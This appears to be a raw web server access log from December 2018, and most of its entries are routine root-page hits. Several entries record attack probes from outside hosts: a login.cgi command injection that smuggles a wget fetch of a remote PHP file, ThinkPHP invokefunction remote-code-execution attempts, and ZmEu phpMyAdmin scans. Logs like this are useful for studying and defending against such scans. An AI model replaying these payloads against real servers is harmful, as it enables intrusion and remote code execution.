65.154.226.100 - - [18/Dec/2018:13:03:45 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
138.197.11.92 - - [18/Dec/2018:13:51:48 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
150.242.254.173 - - [18/Dec/2018:14:55:12 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
194.147.32.109 - - [18/Dec/2018:15:17:26 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xC2\x05\x17I\xD9\xA16\xA8\xC5-'TD\x0E\xC3_2\x0B\xC6=k\x9C\xDA\xE1\x16\x90I\xD4\xE8\x9E\x17l\x00\x00\x8C\xC00\xC0,\xC02\xC0.\xC0/\xC0+\xC01\xC0-\x00\xA5\x00\xA3\x00\xA1\x00\x9F\x00\xA4\x00\xA2\x00\xA0\x00\x9E\xC0(\xC0$\xC0\x14\xC0" 400 182 "-" "-"
177.11.142.37 - - [18/Dec/2018:15:17:33 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.93.41 - - [18/Dec/2018:15:30:10 +0000] "GET / HTTP/1.1" 301 194 "http://red-mammoth.ru/" "Mozilla/5.0 (compatible; U; AnyEvent-HTTP/2.24; +http://software.schmorp.de/pkg/AnyEvent)"
159.192.232.219 - - [18/Dec/2018:15:31:57 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
31.148.12.66 - - [18/Dec/2018:15:42:20 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
180.241.251.82 - - [18/Dec/2018:16:21:14 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
170.82.21.13 - - [18/Dec/2018:17:18:13 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
177.67.4.115 - - [18/Dec/2018:17:25:25 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
39.104.156.127 - - [18/Dec/2018:18:23:11 +0000] "GET /wp-admin/ HTTP/1.1" 404 152 "-" "-"
138.36.190.239 - - [18/Dec/2018:18:51:55 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
192.140.224.134 - - [18/Dec/2018:19:04:18 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
159.65.207.106 - - [18/Dec/2018:19:07:23 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
159.65.207.106 - - [18/Dec/2018:19:07:23 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://128.199.251.119/t.php%27$ HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.106.100.214 - - [18/Dec/2018:19:17:02 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
188.214.186.111 - - [18/Dec/2018:19:32:36 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
162.243.214.227 - - [18/Dec/2018:20:11:44 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 152 "-" "ZmEu"
162.243.214.227 - - [18/Dec/2018:20:11:45 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
162.243.214.227 - - [18/Dec/2018:20:11:45 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
162.243.214.227 - - [18/Dec/2018:20:11:45 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
162.243.214.227 - - [18/Dec/2018:20:11:45 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
162.243.214.227 - - [18/Dec/2018:20:11:46 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
47.106.123.15 - - [18/Dec/2018:20:57:57 +0000] "GET / HTTP/1.1" 404 152 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
212.109.217.105 - - [18/Dec/2018:22:41:03 +0000] "GET / HTTP/1.1" 301 194 "-" "-"
212.36.199.178 - - [18/Dec/2018:22:49:42 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
36.37.208.93 - - [18/Dec/2018:23:15:27 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
115.72.146.241 - - [18/Dec/2018:23:20:36 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
213.57.18.191 - - [19/Dec/2018:00:04:35 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
114.32.60.185 - - [19/Dec/2018:00:11:10 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
196.52.43.86 - - [19/Dec/2018:01:16:53 +0000] "GET / HTTP/1.0" 200 612 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
218.32.127.154 - - [19/Dec/2018:01:38:10 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
5.8.54.27 - - [19/Dec/2018:02:04:18 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
5.8.54.27 - - [19/Dec/2018:02:04:18 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
5.8.54.27 - - [19/Dec/2018:02:04:18 +0000] "GET /html/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
5.8.54.27 - - [19/Dec/2018:02:04:18 +0000] "GET /thinkphp/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
5.8.54.27 - - [19/Dec/2018:02:04:18 +0000] "GET /thinkphp/html/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
5.8.54.27 - - [19/Dec/2018:02:04:18 +0000] "GET /TP/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
5.8.54.27 - - [19/Dec/2018:02:04:19 +0000] "GET /TP/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
5.8.54.27 - - [19/Dec/2018:02:04:19 +0000] "GET /TP/html/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
104.131.137.8 - - [19/Dec/2018:02:14:39 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
153.199.230.157 - - [19/Dec/2018:02:49:44 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
2.179.208.7 - - [19/Dec/2018:03:25:51 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
14.233.135.81 - - [19/Dec/2018:04:09:01 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
14.233.135.81 - - [19/Dec/2018:04:09:02 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
42.115.88.200 - - [19/Dec/2018:04:13:27 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
123.205.59.33 - - [19/Dec/2018:04:21:06 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
123.205.59.33 - - [19/Dec/2018:04:21:07 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
62.98.63.207 - - [19/Dec/2018:04:39:18 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
187.112.26.104 - - [19/Dec/2018:05:33:05 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
178.128.59.191 - - [19/Dec/2018:06:08:39 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 152 "-" "ZmEu"
178.128.59.191 - - [19/Dec/2018:06:08:39 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
178.128.59.191 - - [19/Dec/2018:06:08:40 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
178.128.59.191 - - [19/Dec/2018:06:08:40 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
178.128.59.191 - - [19/Dec/2018:06:08:41 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
178.128.59.191 - - [19/Dec/2018:06:08:41 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 152 "-" "ZmEu"
91.206.149.43 - - [19/Dec/2018:06:15:02 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
